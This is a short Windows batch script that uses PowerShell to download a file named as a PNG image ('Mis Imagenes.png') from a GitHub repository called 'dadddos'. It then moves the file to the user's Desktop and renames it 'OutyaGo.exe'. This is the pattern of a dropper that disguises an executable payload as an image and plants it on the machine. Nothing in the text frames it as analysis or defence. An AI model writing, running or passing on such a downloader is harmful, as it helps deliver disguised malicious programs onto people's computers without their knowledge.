@echo off
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/attthous/dadddos/main/Mis%20Imagenes.png' -OutFile 'Mis Imagenes.png'"
move "Mis imagenes.png" "C:\Users\%PROFILE%\Desktop\OutyaGo.exe"

